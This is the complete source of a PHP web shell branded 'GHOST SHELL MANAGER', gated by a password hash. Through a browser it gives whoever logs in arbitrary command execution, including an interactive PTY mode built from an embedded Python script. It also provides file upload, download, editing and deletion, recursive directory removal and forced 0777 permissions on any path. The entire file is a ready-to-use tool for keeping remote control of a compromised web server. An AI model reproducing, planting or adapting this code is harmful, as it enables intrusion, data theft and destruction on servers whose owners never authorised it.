<?php
session_start();

$pass_hash = '$2a$12$pthnHNBVPLLArRObGHNvA.2U3SiPrQYdcVd4xwknIn0vy0A4fx6XW'; 

if (isset($_POST['p']) && password_verify($_POST['p'], $pass_hash)) {
    $_SESSION['auth'] = true;
}
if (!isset($_SESSION['auth'])) {
    echo '<form method=post><input type=password name=p><input type=submit></form>';
    exit;
}

if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();

// ========== PTY TERMINAL HANDLER ==========
if (isset($_POST['pty_cmd'])) {
    $cmd = trim($_POST['pty_cmd']);
    $cwd = $_SESSION['cwd'];
    
    if (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '~' || $target === '') $newDir = getcwd();
        elseif ($target === '-') $newDir = $_SESSION['last_cwd'] ?? $cwd;
        elseif ($target[0] === '/') $newDir = $target;
        else $newDir = $cwd . '/' . $target;
        
        $newDir = realpath($newDir);
        if ($newDir && is_dir($newDir)) {
            $_SESSION['last_cwd'] = $cwd;
            $_SESSION['cwd'] = $newDir;
            die(json_encode(['cwd' => $newDir, 'output' => '']));
        }
        die(json_encode(['cwd' => $cwd, 'output' => "cd: no such directory\n"]));
    }
    
    // PTY execution via Python
    $escaped_cmd = escapeshellarg($cmd);
    $escaped_cwd = escapeshellarg($cwd);
    
    $python_script = <<<'PYTHON'
import os, sys, pty, subprocess, signal, select, termios, struct, fcntl
os.chdir(sys.argv[1])
master, slave = pty.openpty()
proc = subprocess.Popen(sys.argv[2], shell=True, stdin=slave, stdout=slave, stderr=slave, preexec_fn=os.setsid)
os.close(slave)
def set_term_size(fd):
    try:
        size = struct.pack('HHHH', 24, 80, 0, 0)
        fcntl.ioctl(fd, termios.TIOCSWINSZ, size)
    except: pass
set_term_size(master)
timeout = 0.5
output = b''
try:
    while proc.poll() is None:
        r, _, _ = select.select([master], [], [], timeout)
        if r:
            data = os.read(master, 8192)
            if data: output += data
        else: break
except: pass
os.close(master)
sys.stdout.buffer.write(output)
PYTHON;
    
    $tmpfile = '/tmp/pty_' . md5($cmd . time()) . '.py';
    file_put_contents($tmpfile, $python_script);
    $output = shell_exec('python3 ' . $tmpfile . ' ' . $escaped_cwd . ' ' . $escaped_cmd . ' 2>&1');
    @unlink($tmpfile);
    
    die(json_encode(['cwd' => $cwd, 'output' => $output ?: '']));
}

// ========== TERMINAL HANDLER ==========
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $cwd = $_SESSION['cwd'];
    
    if (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '~' || $target === '') $newDir = getcwd();
        elseif ($target === '-') $newDir = $_SESSION['last_cwd'] ?? $cwd;
        elseif ($target[0] === '/') $newDir = $target;
        else $newDir = $cwd . '/' . $target;
        
        $newDir = realpath($newDir);
        if ($newDir && is_dir($newDir)) {
            $_SESSION['last_cwd'] = $cwd;
            $_SESSION['cwd'] = $newDir;
            die(json_encode(['cwd' => $newDir, 'output' => '']));
        }
        die(json_encode(['cwd' => $cwd, 'output' => "cd: no such directory\n"]));
    }
    
    if (function_exists('proc_open')) {
        $p = proc_open($cmd, [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pipes, $cwd);
        if (is_resource($p)) {
            fclose($pipes[0]);
            $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($p);
            die(json_encode(['cwd' => $cwd, 'output' => $out]));
        }
    }
    if (function_exists('shell_exec')) $out = shell_exec('cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1');
    elseif (function_exists('exec')) { exec('cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1', $o); $out = implode("\n", $o); }
    else $out = "No exec method\n";
    die(json_encode(['cwd' => $cwd, 'output' => $out]));
}

if (isset($_GET['getcwd'])) die(json_encode(['cwd' => $_SESSION['cwd']]));

// Handle actions
if (isset($_GET['cd'])) {
    $dir = $_GET['cd'];
    $newDir = ($dir[0] == '/') ? $dir : $_SESSION['cwd'] . '/' . $dir;
    if (is_dir($newDir)) $_SESSION['cwd'] = realpath($newDir);
    header('Location: ?');
    exit;
}

if (isset($_GET['del'])) {
    @unlink($_SESSION['cwd'] . '/' . $_GET['del']);
    header('Location: ?');
    exit;
}

if (isset($_GET['rmdir'])) {
    $target = $_SESSION['cwd'] . '/' . $_GET['rmdir'];
    if (is_dir($target)) {
        $files = array_diff(scandir($target), array('.', '..'));
        foreach ($files as $file) {
            $path = $target . '/' . $file;
            is_dir($path) ? rmdir($path) : unlink($path);
        }
        @rmdir($target);
    }
    header('Location: ?');
    exit;
}

if (isset($_GET['chmod'])) {
    $target = $_SESSION['cwd'] . '/' . $_GET['chmod'];
    if (is_dir($target) || is_file($target)) @chmod($target, 0777);
    header('Location: ?');
    exit;
}

if (isset($_GET['mkdir'])) {
    $newFolder = $_SESSION['cwd'] . '/' . $_GET['mkdir'];
    if (!is_dir($newFolder)) @mkdir($newFolder, 0777, true);
    header('Location: ?');
    exit;
}

if (isset($_GET['touch'])) {
    $newFile = $_SESSION['cwd'] . '/' . $_GET['touch'];
    if (!is_file($newFile)) @file_put_contents($newFile, '');
    header('Location: ?');
    exit;
}

if (isset($_POST['save']) && isset($_POST['file'])) {
    $file = $_SESSION['cwd'] . '/' . $_POST['file'];
    @file_put_contents($file, $_POST['content'] ?? '');
    header('Location: ?');
    exit;
}

if (isset($_GET['load'])) {
    $f = $_SESSION['cwd'] . '/' . $_GET['load'];
    if (is_file($f)) die(file_get_contents($f));
    exit;
}

if (isset($_GET['home'])) {
    $_SESSION['cwd'] = getcwd();
    header('Location: ?');
    exit;
}

if (isset($_GET['dl'])) {
    $f = $_SESSION['cwd'] . '/' . $_GET['dl'];
    if (is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        readfile($f);
    }
    exit;
}

if (isset($_FILES['up']) && $_FILES['up']['error'] == 0) {
    $target = $_SESSION['cwd'] . '/' . basename($_FILES['up']['name']);
    move_uploaded_file($_FILES['up']['tmp_name'], $target);
    header('Location: ?');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<style>
*{box-sizing:border-box}
body{background:#0a0e12;color:rgb(162, 0, 255);font-family:'Courier New',monospace;padding:20px;margin:0}
a{color:rgb(162, 0, 255);text-decoration:none}
a:hover{color:#ff0}
table{width:100%;border-collapse:collapse}
td,th{padding:8px;text-align:left;border-bottom:1px solid #333}
input,button,textarea{background:#1a1f2e;color:rgb(162, 0, 255);border:1px solid rgb(162, 0, 255);padding:8px;margin:5px;border-radius:6px;font-family:inherit}
button{background:rgb(162, 0, 255);color:#000;cursor:pointer;font-weight:bold}
button:hover{background:#00cc00}
.folder{color:#ff0;font-weight:bold}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999}
.modal-content{background:#0a0e12;margin:5% auto;padding:20px;width:90%;max-width:900px;border-radius:12px;border:1px solid rgb(162, 0, 255);max-height:80vh;overflow:auto}
textarea{width:100%;height:400px;background:#000;color:rgb(162, 0, 255);border:1px solid #333}
.close{float:right;cursor:pointer;color:#f00;font-size:28px}
.tabs{display:flex;gap:5px;margin-bottom:15px;border-bottom:1px solid #333}
.tab{padding:10px 20px;background:#1a1f2e;border:1px solid rgb(162, 0, 255);border-bottom:none;border-radius:8px 8px 0 0;cursor:pointer}
.tab.active{background:rgb(162, 0, 255);color:#000}
.tab-content{display:none}
.tab-content.active{display:block}
.terminal-container{background:#000;border:2px solid rgb(162, 0, 255);border-radius:8px;overflow:hidden}
.terminal-header{background:#1a1f2e;padding:10px;border-bottom:1px solid rgb(162, 0, 255);display:flex;align-items:center}
.terminal-header span{color:rgb(162, 0, 255);font-weight:bold}
.terminal-header .cwd-display{color:#ff0;margin-left:auto;font-size:12px;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.terminal-output {
    background: #000;
    color: rgb(162, 0, 255);
    padding: 15px;
    min-height: 300px;
    max-height: 400px;
    overflow-y: auto;
    font-size: 13px;
    white-space: pre-wrap;
    word-break: break-all;
    user-select: text !important;
    -webkit-user-select: text !important;
    -moz-user-select: text !important;
    -ms-user-select: text !important;
    pointer-events: auto !important;
}
.terminal-output * {
    user-select: text !important;
    -webkit-user-select: text !important;
    -moz-user-select: text !important;
    -ms-user-select: text !important;
}
.terminal-input-line{display:flex;align-items:center;background:#000;padding:10px 15px;border-top:1px solid #333}
.terminal-prompt{color:rgb(162, 0, 255);margin-right:10px}
.terminal-input{flex:1;background:transparent;border:none;color:rgb(162, 0, 255);font-family:inherit;font-size:13px;outline:none}
.clear-btn{background:#333;color:rgb(162, 0, 255);border:1px solid #555;padding:5px 10px;font-size:12px;margin-left:10px}
</style>
<title>👻 GHOST SHELL MANAGER</title>
</head>
<body>

<h2>👻 GHOST SHELL MANAGER</h2>
<div>📍 <span id="currentPath"><?php echo $_SESSION['cwd']; ?></span></div>
<hr>

<div class="tabs">
    <div class="tab active" onclick="switchTab('files')">📁 File Manager</div>
    <div class="tab" onclick="switchTab('terminal')">💻 Terminal</div>
</div>

<div id="tab-files" class="tab-content active">
    <form method=post enctype="multipart/form-data">
        <input type="file" name="up">
        <button type="submit">Upload</button>
    </form>
    <br>
    <form method=get style="display:inline-block">
        <input type="text" name="mkdir" placeholder="folder_name" style="width:150px">
        <button type="submit">📁 Create Folder</button>
    </form>
    <form method=get style="display:inline-block">
        <input type="text" name="touch" placeholder="file.txt" style="width:150px">
        <button type="submit">📄 Create File</button>
    </form>
    <a href="?home=1"><button>🏠 Home</button></a>
    <a href="?cd=.."><button>⬆ Parent</button></a>
    <br><br>

    <h3>📂 Folders</h3>
    <table>
    <tr><th>Name</th><th>Writable</th><th>Actions</th></tr>
    <?php
    $items = scandir($_SESSION['cwd']);
    foreach ($items as $i) {
        if ($i == '.' || $i == '..') continue;
        $path = $_SESSION['cwd'] . '/' . $i;
        if (is_dir($path)) {
            $w = is_writable($path) ? '✅' : '❌';
            $c = is_writable($path) ? 'rgb(162, 0, 255)' : '#f00';
            echo "<tr><td class='folder'><a href='?cd=".urlencode($i)."'>📁 $i</a></td><td style='color:$c'>$w</td>
                <td><a href='?chmod=".urlencode($i)."' onclick=\"return confirm('Force 0777?')\">🔓</a> |
                <a href='?rmdir=".urlencode($i)."' onclick=\"return confirm('Delete?')\" style='color:#f00'>🗑️</a></td></tr>";
        }
    }
    ?>
    </table>

    <h3>📄 Files</h3>
    <table>
    <tr><th>Name</th><th>Size</th><th>Writable</th><th>Actions</th></tr>
    <?php
    foreach ($items as $i) {
        if ($i == '.' || $i == '..') continue;
        $p = $_SESSION['cwd'] . '/' . $i;
        if (!is_dir($p)) {
            $s = filesize($p);
            $size = $s < 1024 ? $s.' B' : ($s < 1048576 ? round($s/1024,1).' KB' : round($s/1048576,1).' MB');
            $w = is_writable($p) ? '✅' : '❌';
            $c = is_writable($p) ? 'rgb(162, 0, 255)' : '#f00';
            echo "<tr><td>📄 $i</td><td>$size</td><td style='color:$c'>$w</td>
                <td><a href='?dl=".urlencode($i)."'>⬇</a> | <a href='javascript:edit(\"".addslashes($i)."\")'>✏️</a> |
                <a href='?del=".urlencode($i)."' onclick=\"return confirm('Delete?')\" style='color:#f00'>🗑️</a> |
                <a href='?chmod=".urlencode($i)."'>🔓</a></td></tr>";
        }
    }
    ?>
    </table>
</div>

<div id="tab-terminal" class="tab-content">
    <div class="terminal-container">
        <div class="terminal-header">
                <span>💻 TERMINAL</span>
                <select id="ptyMode" style="background:#1a1f2e;color:rgb(162, 0, 255);border:1px solid rgb(162, 0, 255);margin-left:10px;padding:3px;">
                    <option value="normal">Normal</option>
                    <option value="pty">PTY (Interactive)</option>
                </select>
                <span class="cwd-display" id="termCwd"><?php echo $_SESSION['cwd']; ?></span>
                <button class="clear-btn" onclick="clearTerminal()">Clear</button>
            </div>
        <div class="terminal-output" id="terminalOutput">
            <div style="color:#666;">GHOST SHELL Interactive Terminal</div>
            <div style="color:#666;">cd &lt;dir&gt; | ls | pwd | cat | rm | ...</div>
            <div style="color:rgb(162, 0, 255);margin-top:10px;">$ Ready</div>
        </div>
        <div class="terminal-input-line">
            <span class="terminal-prompt">┌─[<span id="promptPath"><?php echo basename($_SESSION['cwd']); ?></span>]$</span>
            <input type="text" class="terminal-input" id="terminalInput" placeholder="Type command..." autofocus>
        </div>
    </div>
</div>

<div id="modal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal()">&times;</span>
        <h3>Edit: <span id="fn"></span></h3>
        <textarea id="ta"></textarea>
        <br>
        <button onclick="save()">Save</button>
        <button onclick="closeModal()">Cancel</button>
    </div>
</div>

<script>
let currentCwd = '<?php echo addslashes($_SESSION['cwd']); ?>';
const termOut = document.getElementById('terminalOutput');
const termIn = document.getElementById('terminalInput');
const termCwd = document.getElementById('termCwd');
const promptPath = document.getElementById('promptPath');
const currentPathSpan = document.getElementById('currentPath');

function switchTab(t) {
    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));
    if(t==='files'){document.querySelector('.tab:first-child').classList.add('active');document.getElementById('tab-files').classList.add('active')}
    else{document.querySelector('.tab:last-child').classList.add('active');document.getElementById('tab-terminal').classList.add('active');termIn.focus();refreshCwd()}
}

async function refreshCwd(){
    try{const r=await fetch('?getcwd=1');const d=await r.json();currentCwd=d.cwd;updatePath()}catch(e){}
}

function updatePath(){
    termCwd.textContent=currentCwd;
    promptPath.textContent=currentCwd.split('/').pop()||'/';
    currentPathSpan.textContent=currentCwd;
}

function appendTerminal(t, isCmd) {
    const line = document.createElement('div');
    line.style.userSelect = 'text';
    line.style.webkitUserSelect = 'text';
    line.style.pointerEvents = 'auto';
    
    if (isCmd) {
        line.innerHTML = `<span style="color:#ff0;user-select:text;">$</span> <span style="color:#fff;user-select:text;">${escapeHtml(t)}</span>`;
    } else {
        line.style.whiteSpace = 'pre-wrap';
        line.style.wordBreak = 'break-all';
        line.innerHTML = escapeHtml(t).replace(/\n/g, '<br>');
    }
    termOut.appendChild(line);
    termOut.scrollTop = termOut.scrollHeight;
}

function escapeHtml(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}

function clearTerminal(){termOut.innerHTML='';appendTerminal('Cleared',false)}

async function execCmd(cmd) {
    if (!cmd.trim()) return;
    appendTerminal(cmd, true);
    try {
        const mode = document.getElementById('ptyMode').value;
        const formData = new FormData();
        formData.append(mode === 'pty' ? 'pty_cmd' : 'cmd', cmd);
        
        const res = await fetch('', { method: 'POST', body: formData });
        const data = await res.json();
        if (data.output) appendTerminal(data.output, false);
        if (data.cwd !== currentCwd) { currentCwd = data.cwd; updatePath(); }
    } catch(e) { appendTerminal('Error: ' + e.message, false); }
    termIn.value = ''; termIn.focus();
}

termIn.addEventListener('keydown',async e=>{
    if(e.key==='Enter'){
        const c=termIn.value.trim();
        if(c==='clear'||c==='cls')clearTerminal();
        else await execCmd(c);
        termIn.value=''
    }
});

function edit(f){
    document.getElementById('fn').innerText=f;
    fetch('?load='+encodeURIComponent(f)).then(r=>r.text()).then(d=>{
        document.getElementById('ta').value=d;
        document.getElementById('modal').style.display='block';
        window.cf=f
    })
}

function save(){
    const c=document.getElementById('ta').value;
    fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'save=1&file='+encodeURIComponent(window.cf)+'&content='+encodeURIComponent(c)
    }).then(()=>location.reload())
}

function closeModal(){document.getElementById('modal').style.display='none'}

document.querySelector('.terminal-container').addEventListener('click',()=>termIn.focus());
termIn.addEventListener('blur', () => {});
refreshCwd();
</script>
</body>
</html>
